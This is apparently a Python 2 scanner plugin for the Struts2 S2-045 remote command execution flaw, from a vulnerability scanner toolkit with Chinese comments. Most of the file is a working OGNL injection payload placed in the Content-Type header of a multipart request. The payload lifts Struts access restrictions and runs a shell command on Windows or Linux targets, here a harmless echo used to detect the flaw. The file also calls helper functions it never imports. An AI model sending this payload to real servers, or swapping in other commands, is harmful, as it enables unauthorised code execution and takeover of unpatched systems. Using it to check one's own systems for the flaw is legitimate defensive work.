#coding=utf-8
import requests
from lib import ttlscanlogger
import urllib2

def POC_INFO():
    dict_poc={};
    dict_poc["name"]="Struts2_045 RCE"
    dict_poc["Chinese_name"]="Struts2_045 远程命令执行漏洞"
    dict_poc["author"]="跳跳龙"
    return dict_poc


# 最新爆出来的漏洞 2017.03.07
def poc_test(target_url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("./tmp.txt", "rb")})
    header[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header[
        "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(target_url, datagen, headers=header)
    response = urllib2.urlopen(request)
    body = response.read()
    return body


def POC(target_url):
    try:
        body = poc_test(target_url)
        if "nMask" in body:
            # return 1
            ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_045 vulnerabillity ".format(target_url))
            return True
            # HttpResponse("true")
        else:
            # return 2
            return False
    except Exception, e:
        # return (alse,"struts2-045",target_url)
        return False